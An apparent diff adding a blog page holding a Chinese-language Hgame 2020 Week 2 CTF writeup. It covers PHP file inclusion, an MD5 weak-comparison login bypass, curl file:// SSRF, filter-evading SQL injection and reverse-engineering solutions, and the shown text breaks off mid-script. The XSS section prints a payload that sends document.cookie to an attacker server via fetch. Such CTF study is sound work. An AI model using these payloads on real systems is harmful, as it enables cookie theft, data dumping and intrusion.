@@ -1,0 +1,1067 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <title> xᴊᴀsᴏɴʟʏᴜ | Hgame Week2 Writeup </title>
+    <meta charset="utf-8"><meta name="generator" content="Hugo 0.69.2" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="description" content="ID = randint(0, 1) ? 12x : xjasonlyu">
+    <link rel="stylesheet" href="https://12x.me/css/style.css" type="text/css">
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    <base href="https://12x.me">
+    
+    <link rel="shortcut icon" href="https://12x.me/favicons/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://12x.me/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://12x.me/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://12x.me/favicons/favicon-16x16.png">
+
+    <link rel="canonical" href="https://12x.me/post/hgame-week2-writeup/">
+</head><body><div class="sidebar animated fadeInDown">
+    <div class="logo-title">
+      <div class="title">
+        <img src="https://12x.me/images/profile.jpg" alt="profile picture" style="width:127px;border-radius: 50%;">
+        <h3 title=""><a href="/">I&#39;m Jason Lyu</a></h3>
+        <div class="description">
+          <p>ID = randint(0, 1) ? 12x : xjasonlyu</p>
+        </div>
+      </div>
+    </div>
+    <ul class="social-links">
+        
+        <a href="https://twitter.com/xjasonlyu" rel="me" >
+          <i class="fa fa-twitter" aria-hidden="true" title="Twitter"></i>
+        </a>
+        
+        <a href="https://github.com/xjasonlyu" rel="me" >
+          <i class="fa fa-github" aria-hidden="true" title="GitHub"></i>
+        </a>
+        
+        <a href="mailto:this@12x.me" rel="me" >
+          <i class="fa fa-envelope" aria-hidden="true" title="e-mail"></i>
+        </a>
+        
+    </ul>
+    <div class="footer">
+        <div class="by_farbox">&copy; xᴊᴀsᴏɴʟʏᴜ 2020 </div>
+      </div>
+    </div>
+</div><div class="main">
+            <div class="page-top animated fadeInDown">
+    <div class="nav">
+        
+        
+        <li><a  href="/" title="">Home</a></li>
+
+        
+        <li><a  href="/post/" title="">Archive</a></li>
+
+        
+        <li><a  href="/about/" title="About">About</a></li>
+
+        
+    </div>
+</div>
+            <div class="autopagerize_page_element">
+                <div class="content">
+<div class="post animated fadeInDown">
+    <div class="post-content">
+
+      <div class="post-title">
+        <h3>Hgame Week2 Writeup
+        </h3>
+        
+        <div class="info">
+          <i class="fa fa-sun-o"></i><span class="date">Fri, Jan 24, 2020</span>
+          <i class="fa fa-clock-o"></i><span class="reading-time">15-minute read</span>
+        </div>
+        
+        </div>
+
+    <h2 id="hgame-week2-writeup">Hgame Week2 Writeup</h2>
+<p><img src="media/15792383134168/logo.png" alt="logo"></p>
+<h3 id="0x00-web">0x00 Web</h3>
+<h4 id="cosmos的博客后台">Cosmos的博客后台</h4>
+<p>PHP文件包含的题目。<code>/?action=url</code>
+于是用<code>php://filter/convert.base64-encode/resource=login.php</code>拿到了login.php的源码（部分源码如下）</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if (DEBUG_MODE){
+    if(isset($_GET[&#39;debug&#39;])) {
+        $debug = $_GET[&#39;debug&#39;];
+        if (!preg_match(&#34;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&#34;, $debug)) {
+            die(&#34;args error!&#34;);
+        }
+        eval(&#34;var_dump($$debug);&#34;);
+    }
+}
+
+if(isset($_SESSION[&#39;username&#39;])) {
+    header(&#34;Location: admin.php&#34;);
+    exit();
+}
+</code></pre></div><p>根据这里的信息又拿到了<code>admin.php</code>和<code>index.php</code>的源码。
+再看这一句<code>eval(&quot;var_dump($$debug);&quot;);</code>，可以dump变量
+<img src="media/15798363305346/Screen%20Shot%202020-01-28%20at%2012.31.05%20PM.png" alt="Screen Shot 2020-01-28 at 12.31.05 P-w569">
+拿到登录账号和<del>密码</del>MD5密码哈希值</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if ($admin_password == md5($_POST[&#39;password&#39;]) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> $_POST[&#39;username&#39;] === $admin_username)
+</code></pre></div><p>仔细看源码，发现这里是密码的弱类型比较，只要密码的哈希值是<code>0e</code>开头的那么就会当作数字0来比较从而绕过。
+网上随便一搜一大把，这里我用<code>s878926199a</code>成功登入。
+接着来到后台管理页面，查看源码发现</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function insert_img() {
+    if (isset($_POST[&#39;img_url&#39;])) {
+        $img_url = @$_POST[&#39;img_url&#39;];
+        $url_array = parse_url($img_url);
+        if (@$url_array[&#39;host&#39;] !== &#34;localhost&#34; <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> $url_array[&#39;host&#39;] !== &#34;timgsa.baidu.com&#34;) {
+            return false;
+        }   
+        $c = curl_init();
+        curl_setopt($c, CURLOPT_URL, $img_url);
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+        $res = curl_exec($c);
+        curl_close($c);
+        $avatar = base64_encode($res);
+
+        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
+            return $avatar;
+        }
+    }
+    else {
+        return base64_encode(file_get_contents(&#34;static/logo.png&#34;));
+    }
+}
+</code></pre></div><p>emmm，这里卡了我好久，查了curl资料之后才想起来curl是支持file协议的。。
+于是输入<code>file://localhost/flag</code>绕过
+<img src="media/15798363305346/Screen%20Shot%202020-01-28%20at%203.08.12%20PM.png" alt="Screen Shot 2020-01-28 at 3.08.12 P-w603">
+解码
+<img src="media/15798363305346/Screen%20Shot%202020-01-28%20at%203.10.18%20PM.png" alt="Screen Shot 2020-01-28 at 3.10.18 P-w450">
+拿到flag</p>
+<h4 id="cosmos的留言板-1">Cosmos的留言板-1</h4>
+<p>很基础的SQL注入题，但我的SQL真的好烂，还得多亏出题人不厌其烦耐心的指导👍（省略掉无数的辛酸摸索过程。。。）
+经过初步测试后可知：</p>
+<ul>
+<li>空格会被过滤，可以用<code>%0a</code>替代</li>
+<li><code>select</code>会被过滤，但是可以用大小写绕过</li>
+</ul>
+<p>写了个PY函数来快速替换</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">f <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(x)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;select&#39;</span>, <span style="color:#e6db74">&#39;SELECT&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;%20&#39;</span>,<span style="color:#e6db74">&#39;%0a&#39;</span>)
+</code></pre></div><p>过程写得详细一点当作学习了</p>
+<p>首先爆库名：<code>-1' union select database();#</code>
+编码得：<code>id%3D-1%27%0aunion%0aSELECT%0adatabase%28%29%3B%23</code>
+<img src="media/15798363305346/Screen%20Shot%202020-01-27%20at%2010.48.47%20PM.png" alt="Screen Shot 2020-01-27 at 10.48.47 P-w391">
+得到数据库名：<code>easysql</code></p>
+<p>再爆表名：<code>-1' union select group_concat(table_name) from information_schema.tables where table_schema=database();#</code>
+编码得：<code>-1%27%0aunion%0aSELECT%0agroup_concat%28table_name%29%0afrom%0ainformation_schema.tables%0awhere%0atable_schema%3Ddatabase%28%29%3B%23</code>
+<img src="media/15798363305346/Screen%20Shot%202020-01-27%20at%2010.49.41%20PM.png" alt="Screen Shot 2020-01-27 at 10.49.41 P-w1306">
+得到所有表名：<code>f1aggggggggggggg,messages</code></p>
+<p>接着爆字段：<code>-1' union select group_concat(column_name) from information_schema.columns where table_name=0x66316167676767676767676767676767;#</code>
+<del>这里的十六进制生成</del>（后来问了出题人，直接用字符串也行的，wtcl）</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">hex(int<span style="color:#f92672">.</span>from_bytes(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;f1aggggggggggggg&#39;</span>, <span style="color:#e6db74">&#39;big&#39;</span>))
+</code></pre></div><p>编码得：<code>-1%27%0aunion%0aSELECT%0agroup_concat%28column_name%29%0afrom%0ainformation_schema.columns%0awhere%0atable_name%3D0x66316167676767676767676767676767%3B%23</code>
+<img src="media/15798363305346/Screen%20Shot%202020-01-27%20at%2010.52.31%20PM.png" alt="Screen Shot 2020-01-27 at 10.52.31 P-w1680">
+得到字段名：<code>fl4444444g</code></p>
+<p>最后就是拿flag了：<code>-1' union select fl4444444g from f1aggggggggggggg;#</code>
+编码后：<code>-1%27%0aunion%0aSELECT%0afl4444444g%0afrom%0af1aggggggggggggg%3B%23</code>
+<img src="media/15798363305346/Screen%20Shot%202020-01-27%20at%2011.04.41%20PM.png" alt="Screen Shot 2020-01-27 at 11.04.41 P-w686">
+拿到flag：<code>hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></p>
+<p>参考资料：<a href="https://blog.csdn.net/xuchen16/article/details/82785371">bugku成绩单（sql注入）writeup</a></p>
+<h4 id="cosmos的新语言">Cosmos的新语言</h4>
+<p>刚开始打开没看懂啥意思（因为忘了还有个mycode路径了2333）
+<img src="media/15798363305346/Screen%20Shot%202020-01-26%20at%201.23.14%20PM.png" alt="Screen Shot 2020-01-26 at 1.23.14 P-w1059">
+打开mycode之后发现就是会定时随机变化的编码组合，那就很简单了，直接写脚本。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">import</span> html
+<span style="color:#f92672">import</span> base64
+<span style="color:#f92672">import</span> requests
+
+functionMap <span style="color:#f92672">=</span> {
+    <span style="color:#e6db74">&#39;base64_encode&#39;</span>: <span style="color:#66d9ef">lambda</span> x: base64<span style="color:#f92672">.</span>b64decode(x<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode(),
+    <span style="color:#e6db74">&#39;encrypt&#39;</span>: <span style="color:#66d9ef">lambda</span> x: <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([ chr(ord(i) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> x ]),
+    <span style="color:#e6db74">&#39;strrev&#39;</span>: <span style="color:#66d9ef">lambda</span> x: x[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],
+    <span style="color:#e6db74">&#39;str_rot13&#39;</span>: <span style="color:#66d9ef">lambda</span> x: x<span style="color:#f92672">.</span>translate(str<span style="color:#f92672">.</span>maketrans(<span style="color:#e6db74">&#34;ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz&#34;</span>,<span style="color:#e6db74">&#34;NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm&#34;</span>)),
+    }
+
+s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getOutput</span>():
+    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://17f37c65aa.php.hgame.n3ko.co/&#39;</span>)
+    r<span style="color:#f92672">.</span>raise_for_status()
+    <span style="color:#66d9ef">return</span> html<span style="color:#f92672">.</span>unescape(r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">4</span>][:<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>])
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getCode</span>():
+    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://17f37c65aa.php.hgame.n3ko.co/mycode&#39;</span>)
+    r<span style="color:#f92672">.</span>raise_for_status()
+    code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>):
+        <span style="color:#66d9ef">if</span> i[:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;echo&#39;</span>:
+            code <span style="color:#f92672">=</span> i
+            <span style="color:#66d9ef">break</span>
+    <span style="color:#75715e"># print(code)</span>
+    code <span style="color:#f92672">=</span> code[<span style="color:#ae81ff">5</span>:code<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;($_SERVER&#39;</span>)]
+    <span style="color:#66d9ef">return</span> code<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;(&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">postToken</span>(token):
+    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://17f37c65aa.php.hgame.n3ko.co/&#39;</span>, data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;token&#39;</span>: token})
+    r<span style="color:#f92672">.</span>raise_for_status()
+    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>text
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calcToken</span>(output, code):
+    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> code:
+        <span style="color:#75715e"># print(c, repr(output))</span>
+        f <span style="color:#f92672">=</span> functionMap[c]
+        output <span style="color:#f92672">=</span> f(output)
+    <span style="color:#66d9ef">return</span> output
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parseFlag</span>(result):
+    <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> result<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>):
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;hgame&#39;</span> <span style="color:#f92672">in</span> l:
+            <span style="color:#66d9ef">return</span> l
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    output <span style="color:#f92672">=</span> getOutput()
+    <span style="color:#66d9ef">print</span>(output)
+
+    code <span style="color:#f92672">=</span> getCode()
+    <span style="color:#66d9ef">print</span>(code)
+
+    token <span style="color:#f92672">=</span> calcToken(output, code)
+    <span style="color:#66d9ef">print</span>(token)
+
+    result <span style="color:#f92672">=</span> postToken(token)
+    <span style="color:#75715e"># print(result)</span>
+
+    flag <span style="color:#f92672">=</span> parseFlag(result)
+    <span style="color:#66d9ef">print</span>(flag)
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    main()
+</code></pre></div><p>运行
+<img src="media/15798363305346/Screen%20Shot%202020-01-26%20at%201.25.52%20PM.png" alt="Screen Shot 2020-01-26 at 1.25.52 P-w900">
+拿到flag</p>
+<h4 id="cosmos的聊天室">Cosmos的聊天室</h4>
+<p>这道题考的是XSS攻击，经过测试摸清了平台基本的XSS过滤规则</p>
+<ul>
+<li>尖括号<code>&lt;&gt;</code>里的会过滤掉（不闭合没关系）</li>
+<li><code>script</code>，<code>iframe</code>之类的tag会被替换成<code>HI THERE!</code></li>
+<li>会多所有输入进行大写替换</li>
+</ul>
+<p>下面就要开始想怎么绕过，有几点可以考虑：既然不能出现<code>script</code>，那么可以考虑用其他tag的某个属性来执行；所有字母都会大写，那可以用特殊的编码来绕过。
+我的payload生成脚本如下</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">js <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([ <span style="color:#e6db74">&#39;&amp;#&#39;</span><span style="color:#f92672">+</span>str(ord(i))<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;;&#39;</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> x])
+
+cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fetch(&#39;http://myserver/?&#39;+document.cookie)&#34;</span>
+
+payload <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#39;&lt;img src=none onerror=&#34;{js(cmd)}&#34;&#39;</span>
+
+<span style="color:#66d9ef">print</span>(payload)
+</code></pre></div><p>服务端是很简单的用<code>python3 -m http.server</code>搭了一个，在平台测试成功，下面继续</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">import</span> hashlib
+
+md5 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: hashlib<span style="color:#f92672">.</span>md5(x<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100000000</span>):
+    s <span style="color:#f92672">=</span> str(i)
+    d <span style="color:#f92672">=</span> md5(s)[:<span style="color:#ae81ff">6</span>]<span style="color:#f92672">.</span>lower()
+    <span style="color:#75715e"># print(d)</span>
+    <span style="color:#66d9ef">if</span> d <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;4d7c27&#39;</span>: <span style="color:#75715e"># code</span>
+        <span style="color:#66d9ef">print</span>(s)
+        <span style="color:#66d9ef">break</span>
+</code></pre></div><p>code很简单，md5碰撞一下就能绕过，然后提交
+<img src="media/15798363305346/Screen%20Shot%202020-01-26%20at%204.52.07%20PM.png" alt="Screen Shot 2020-01-26 at 4.52.07 P-w802">
+拿到admin的token，接下来用charles来<code>GET /flag</code>
+<img src="media/15798363305346/Screen%20Shot%202020-01-26%20at%204.54.15%20PM.png" alt="Screen Shot 2020-01-26 at 4.54.15 P-w961">
+最后成功拿到flag</p>
+<h5 id="week2-web-ak">Week2 Web AK</h5>
+<h3 id="0x01-reverse">0x01 Reverse</h3>
+<h4 id="unpack">unpack</h4>
+<p>这是一道upx的脱壳题，但是放了学习资料<a href="https://www.52pojie.cn/thread-1048649-1-1.html">ELF64手脱UPX壳实战</a>，就变成了白给题2333
+跟着教程一步步来，基本一致，所以就不放图了，最后dump出来源程序再ida打开F5
+<img src="media/15798363305346/image-20200126194646837.png" alt="image-20200126194646837-w595">
+十分简单，python跑一下</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">b <span style="color:#f92672">=</span> (
+    <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x5B</span>,
+    <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x6D</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x7B</span>,
+    <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x6E</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x84</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x44</span>,
+    <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x4A</span>, <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0x8C</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x7D</span>, <span style="color:#ae81ff">0x7A</span>,
+    <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x7E</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x98</span>,
+    <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0x8F</span>, <span style="color:#ae81ff">0xA6</span>,
+    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
+    )
+
+
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">42</span>):
+    flag <span style="color:#f92672">+=</span> chr(b[i]<span style="color:#f92672">-</span>i)
+
+<span style="color:#66d9ef">print</span>(flag)
+</code></pre></div><p>拿到flag：<code>hgame{Unp@cking_1s_R0m4ntic_f0r_r3vers1ng}</code></p>
+<h4 id="classic_crackme">Classic_CrackMe</h4>
+<p>这题是用.net写的图形化界面程序，用reflector打开找到主逻辑函数
+<img src="media/15798363305346/Screen%20Shot%202020-01-27%20at%204.20.11%20PM.png" alt="Screen Shot 2020-01-27 at 4.20.11 P-w1327">
+流程很简单，源码就摆在那，从而变成了一道AES_CBC解密题。
+想要解密这个就必须要知道AES_CBC模式的加密规则和原理</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">CBC加密原理：明文跟向量异或，再用KEY进行加密，结果作为下个BLOCK的初始化向量。解密原理：使用密钥先对密文解密，解密后再同初始向量异或得到明文。
+
+CBC需要对明文块大小进行Padding（补位），由于前后加密的相关性，只能实施串行化动作，无法并行运算。另外，CBC需要参量：密钥和初始化向量。
+</code></pre></div><p>那接下来就很简单了，直接用Python Decrypt。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">import</span> base64
+<span style="color:#f92672">import</span> pyaes
+<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+<span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> pad, unpad
+
+b64Key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;SGc0bTNfMm8yMF9XZWVLMg==&#39;</span>
+b64IV <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MFB1T2g5SWxYMDU0SWN0cw==&#39;</span>
+key <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b64Key) <span style="color:#75715e"># Hg4m3_2o20_WeeK2</span>
+iv <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b64IV)   <span style="color:#75715e"># 0PuOh9IlX054Icts</span>
+
+str4 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Same_ciphertext_&#39;</span>
+str3_ct <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;dJntSWSPWbWocAq4yjBP5Q==&#39;</span>
+hint_ct <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&#39;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(key: bytes, iv: bytes, plaintext: bytes):
+    _aes <span style="color:#f92672">=</span> pyaes<span style="color:#f92672">.</span>AES(key)
+    precipherblock <span style="color:#f92672">=</span> [ (p <span style="color:#f92672">^</span> l) <span style="color:#66d9ef">for</span> (p, l) <span style="color:#f92672">in</span> zip(plaintext, iv) ]
+    ciphertext <span style="color:#f92672">=</span> _aes<span style="color:#f92672">.</span>encrypt(precipherblock)
+    <span style="color:#66d9ef">return</span> ciphertext
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(key: bytes, iv: bytes, ciphertext: bytes):
+    _aes <span style="color:#f92672">=</span> pyaes<span style="color:#f92672">.</span>AES(key)
+    plaintext <span style="color:#f92672">=</span> [ (p <span style="color:#f92672">^</span> l) <span style="color:#66d9ef">for</span> (p, l) <span style="color:#f92672">in</span> zip(_aes<span style="color:#f92672">.</span>decrypt(ciphertext), iv) ]
+    <span style="color:#66d9ef">return</span> bytes(plaintext)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calcIV</span>(key: bytes, plaintext: bytes, ciphertext: bytes):
+    _aes <span style="color:#f92672">=</span> pyaes<span style="color:#f92672">.</span>AES(key)
+    iv <span style="color:#f92672">=</span> [ (p <span style="color:#f92672">^</span> l) <span style="color:#66d9ef">for</span> (p, l) <span style="color:#f92672">in</span> zip(_aes<span style="color:#f92672">.</span>decrypt(ciphertext), plaintext) ]
+    <span style="color:#66d9ef">return</span> bytes(iv)
+
+str2 <span style="color:#f92672">=</span> calcIV(key, str4, base64<span style="color:#f92672">.</span>b64decode(hint_ct)[:<span style="color:#ae81ff">16</span>])
+ct <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, str2)<span style="color:#f92672">.</span>encrypt(str4<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x10</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+<span style="color:#66d9ef">assert</span> base64<span style="color:#f92672">.</span>b64encode(ct) <span style="color:#f92672">==</span> hint_ct
+
+_iv <span style="color:#f92672">=</span> encrypt(key, iv, str4)
+str3 <span style="color:#f92672">=</span> decrypt(key, _iv, base64<span style="color:#f92672">.</span>b64decode(str3_ct))
+ct <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)<span style="color:#f92672">.</span>encrypt(str4<span style="color:#f92672">+</span>str3)[<span style="color:#ae81ff">16</span>:]
+<span style="color:#66d9ef">assert</span> base64<span style="color:#f92672">.</span>b64encode(ct) <span style="color:#f92672">==</span> str3_ct
+
+str2 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(str2)
+str3 <span style="color:#f92672">=</span> unpad(str3, AES<span style="color:#f92672">.</span>block_size)
+
+flag <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#39;hgame{{{str2.decode()}{str3.decode()}}}&#39;</span>
+<span style="color:#66d9ef">print</span>(flag)
+</code></pre></div><p>运行得到<code>hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d}</code>，拿到flag</p>
+<h4 id="babypy">babyPy</h4>
+<p>简单的python字节码和虚拟指令，对应官方文档<a href="https://docs.python.org/zh-cn/3/library/dis.html">Python字节码反汇编器</a>可以逆出源代码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">import</span> dis
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(msg):
+    a <span style="color:#f92672">=</span> msg[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+    b <span style="color:#f92672">=</span> list(a)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, len(b)):
+        c <span style="color:#f92672">=</span> b[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">^</span> b[i]
+        b[i] <span style="color:#f92672">=</span> c
+    O <span style="color:#f92672">=</span> bytes(b)
+    <span style="color:#66d9ef">return</span> O<span style="color:#f92672">.</span>hex()
+
+<span style="color:#75715e">##print(dis.dis(encrypt))</span>
+</code></pre></div><p>拿到源代码写出解密函数</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22&#39;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(cipher):
+    b <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(cipher)
+    c <span style="color:#f92672">=</span> bytearray(b)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, len(b)):
+        x <span style="color:#f92672">=</span> b[i] <span style="color:#f92672">^</span> b[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+        c[i] <span style="color:#f92672">=</span> x
+    c<span style="color:#f92672">.</span>reverse()
